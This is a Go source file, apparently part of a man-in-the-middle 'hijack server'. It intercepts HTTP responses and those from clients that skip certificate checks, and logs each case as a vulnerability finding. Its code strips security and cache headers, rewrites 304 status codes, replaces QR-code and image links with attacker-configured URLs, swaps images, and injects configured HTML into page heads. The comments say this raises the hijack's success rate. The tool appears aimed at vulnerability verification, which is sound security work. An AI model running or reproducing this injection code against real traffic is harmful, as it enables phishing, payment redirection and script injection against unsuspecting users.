package handler

import (
	"bytes"
	"encoding/json"
	"fmt"
	"github.com/vpxuser/proxy"
	"hijack-server/record"
	"hijack-server/setting"
	"hijack-server/tools"
	"io"
	"net/http"
	"net/http/httputil"
	"strings"
	"sync"
)

func removeHeaders(resp *http.Response, set map[string][]string) {
	for _, headers := range set {
		for _, header := range headers {
			resp.Header.Del(header)
		}
	}
}

var blackList = new(sync.Map)

func Response(resp *http.Response, ctx *proxy.Context) *http.Response {
	entry := record.NewEntry()
	report := new(strings.Builder)

	//根据协议判断劫持类型，劫持类型如下：
	//1、http明文传输：使用明文http协议传输请求
	//2、ssl校验失效：客户端没有对证书的有效性进行校验，错误类型分为：
	//	证书尚未生效 (NOT_YET_VALID)
	//	证书已过期 (EXPIRED)
	//	证书与服务器名称不匹配 (ID_MISMATCH)
	//	证书不受信任 (UNTRUSTED)
	//	证书日期无效 (DATE_INVALID)
	//	证书无效 (INVALID)
	report.WriteString("劫持/漏洞类型：")
	switch resp.Request.URL.Scheme {
	case "http":
		entry.Plugin = "HTTP 明文传输"
		report.WriteString("http 明文传输\n")
	case "https":
		entry.Plugin = "SSL 客户端忽略证书校验错误"
		report.WriteString("ssl 客户端忽略证书校验错误\n")
	}

	//打印被劫持的请求路径
	url := resp.Request.URL.String()
	entry.Target.Url = url
	report.WriteString(fmt.Sprintf("       ├── 劫持路径：%s\n", url))

	entry.Detail.Addr = fmt.Sprintf("%s://%s%s",
		resp.Request.URL.Scheme, resp.Request.URL.Host, resp.Request.URL.Path)

	//优化响应体结构
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		ctx.Error(err)
		return resp
	}

	//部分响应存在使用了Gzip压缩，要解压响应，才能劫持响应里的内容
	compressed := false
	contentEncoding := resp.Header.Get("Content-Encoding")
	if strings.Contains(contentEncoding, "gzip") &&
		body[0] == 0x1f &&
		body[1] == 0x8b {
		compressed = true
		body, err = tools.GzipDecompress(body)
		if err != nil {
			ctx.Error(err)
			resp.Body = io.NopCloser(bytes.NewBuffer(body))
			return resp
		}
		report.WriteString(fmt.Sprintf("       ├── 响应体编码类型：%s\n", contentEncoding))
	}

	contentType := resp.Header.Get("Content-Type")
	report.WriteString(fmt.Sprintf("       ├── 响应体载荷类型：%s\n", contentType))

	//json格式化
	if strings.Contains(contentType, "application/json") {
		pettyBody, _ := json.MarshalIndent(json.RawMessage(body), "", "  ")
		resp.ContentLength = int64(len(pettyBody))
		resp.Body = io.NopCloser(bytes.NewBuffer(pettyBody))
	} else {
		resp.Body = io.NopCloser(bytes.NewBuffer(body))
	}

	dump, _ := httputil.DumpResponse(resp, true)
	ctx.Debugf("是否压缩：%v，响应体：\n%s", compressed, dump)

	//存储请求和响应快照
	snapshot := []string{ctx.Extra.(string), string(dump)}
	entry.Detail.Snapshot = append(entry.Detail.Snapshot, snapshot)

	//部分响应状态码会禁止客户端刷新静态资源，不删除可能会出现劫持失败的情况
	switch resp.StatusCode {
	case http.StatusNotModified:
		report.WriteString(fmt.Sprintf("       ├── 重写响应状态码：%d => ", resp.StatusCode))
		resp.StatusCode = http.StatusOK
		report.WriteString(fmt.Sprintf("%d\n", resp.StatusCode))
	}

	//删除所有安全头和缓存头，防止头部设置影响劫持攻击的成功率
	//1、安全头定义了客户端对响应的解析行为，会禁止客户端解析js代码，不删除可能会出现劫持失败的情况
	//2、缓存头定义了客户端是否刷新静态资源缓存，不删除可能会出现劫持失败的情况
	removeHeaders(resp, setting.Headers)

	//填充响应的唯一id，方便日志追踪
	resp.Header.Set("X-Request-ID", resp.Request.Header.Get("X-Request-ID"))

	//从这里开始劫持攻击
	hijacked := false

	//通过正则匹配响应体中的链接并替换
	var details, links []string
	for detail, matcher := range setting.QRCode {
		if matcher.Match(body) {
			hijacked = true
			links = append(links, matcher.FindAllString(string(body), -1)...)
			body = matcher.ReplaceAll(body, []byte("{{QRCODE_LINK}}"))
			details = append(details, detail)
		}
	}

	if len(details) > 0 {
		detail := strings.Join(details, "、")
		entry.Detail.Payload = fmt.Sprintf("替换响应体里的 %s 链接", detail)
		report.WriteString(fmt.Sprintf("       ├── 劫持方式：替换响应体里的 %s 链接\n", detail))
	}

	//通过正则替换非二维码图片链接
	if tools.ImageLinkRule.Match(body) {
		hijacked = true
		links = append(links, tools.ImageLinkRule.FindAllString(string(body), -1)...)
		body = tools.ImageLinkRule.ReplaceAll(body, []byte(setting.Cfg.ImageURL))
		entry.Detail.Payload = "替换响应体里的 图片 链接"
		report.WriteString("       ├── 劫持方式：替换响应体里的 图片 链接\n")
	}

	if len(links) > 0 {
		entry.Detail.Extra["links"] = strings.Join(links, "、")
	}

	//替换二维码链接
	body = bytes.ReplaceAll(body, []byte("{{QRCODE_LINK}}"), []byte(setting.Cfg.QRCodeURL))

	//识别响应体数据类型，如果为图片或html则进行劫持
	contentType = http.DetectContentType(body)
	if strings.Contains(contentType, "image/") {
		hijacked = true
		body = setting.Image
		entry.Detail.Payload = "替换 图片 响应体"
		report.WriteString("       ├── 劫持方式：替换图片响应体\n")
	} else if strings.Contains(contentType, "/html") {
		hijacked = true
		body = bytes.Replace(body, []byte("<head>"), setting.Html, 1)
		entry.Detail.Payload = "替换 Html 响应体"
		report.WriteString("       ├── 劫持方式：网页劫持\n")
	}

	//重新压缩响应体，不压缩的话，客户端可能无法显示劫持内容
	if compressed {
		body, err = tools.GzipCompress(body)
		if err != nil {
			ctx.Error(err)
			resp.Body = io.NopCloser(bytes.NewBuffer(body))
			return resp
		}
	}

	report.WriteString(fmt.Sprintf("       └── 劫持状态：%v", hijacked))
	//劫持完成，打印报告
	ctx.Infof(report.String())

	//第一次劫持的路径，直接发送到报告生成器
	_, ok := blackList.Load(entry.Target.Url)
	if setting.Cfg.Report && hijacked && !ok {
		go record.Push(entry)
	} else {
		blackList.Store(entry.Target.Url, struct{}{})
	}

	//修正响应参数
	resp.ContentLength = int64(len(body))
	resp.Body = io.NopCloser(bytes.NewBuffer(body))
	return resp
}
